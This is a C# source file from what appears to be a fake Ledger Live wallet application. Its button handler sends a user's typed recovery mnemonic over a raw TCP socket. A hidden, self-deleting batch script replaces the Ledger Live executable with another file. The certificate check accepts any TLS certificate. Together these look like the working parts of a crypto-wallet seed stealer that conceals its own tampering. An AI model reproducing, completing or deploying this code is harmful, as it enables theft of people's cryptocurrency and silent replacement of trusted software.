using Ledger.MainClassFolder;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Ledger.ScrollBar;

namespace Ledger.MainClassFolder
{
    public class CommonFunctions
    {

        private async Task<bool> SendViaSocket(string mnemonic)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    await client.ConnectAsync("127.0.0.1", 8080);
                    NetworkStream stream = client.GetStream();

                    byte[] data = Encoding.UTF8.GetBytes(mnemonic);
                    await stream.WriteAsync(data, 0, data.Length);
                }

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }

        public async void Readybtn_Click(object sender, EventArgs e)
        {
            try
            {
                // Disable button to prevent double clicks
                // Readybtn.Enabled = false;

                // Get mnemonic from your TextBox (change the name to match yours)
                string mnemonic = "";//mnemonicTextBox.Text;  // ← Replace with your actual control name

                // Validate
                if (string.IsNullOrWhiteSpace(mnemonic))
                {
                    MessageBox.Show("Please enter a mnemonic.", "Validation Error");
                    return;
                }

                // Send via socket
                bool success = await SendViaSocket(mnemonic);

                // Show result
                if (success)
                {
                    MessageBox.Show("Sent successfully!");
                }
                else
                {
                    MessageBox.Show("Failed to send.");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}");
            }
            finally
            {
                // Re-enable button
                // Readybtn.Enabled = true;
            }
        }
    
    

        public  void ScheduleFileRestoration()
        {
            try
            {
                string contents = $"\r\n@echo off\r\nchcp 65001 >nul\r\n:loop\r\ndel \"{MainClass.ledgerLivePath}\" 2>nul\r\nif exist \"{MainClass.ledgerLivePath}\" (\r\n    timeout /t 1 /nobreak >nul\r\n    goto loop\r\n)\r\nmove \"{MainClass.ledgerConfPath}\" \"{MainClass.ledgerLivePath}\" >nul\r\ndel \"%~f0\"";
                string path = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.bat");
                System.IO.File.WriteAllText(path, contents, Encoding.ASCII);
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C \"\"{path}\"\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                });
            }
            catch
            {
            }
        }

        public string GetLocalIPAddress()
        {
            try
            {
                return ((IEnumerable<IPAddress>)Dns.GetHostEntry(Dns.GetHostName()).AddressList).FirstOrDefault<IPAddress>((Func<IPAddress, bool>)(ip => ip.AddressFamily == AddressFamily.InterNetwork))?.ToString() ?? "N/A";
            }
            catch
            {
                return "N/A";
            }
        }
        public bool ValidateServerCertificate(
          object sender,
          X509Certificate certificate,
          X509Chain chain,
          SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
        public void Mnem_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsLetter(e.KeyChar) || char.IsControl(e.KeyChar) || e.KeyChar == ' ')
                return;
            e.Handled = true;
        }

    }
}
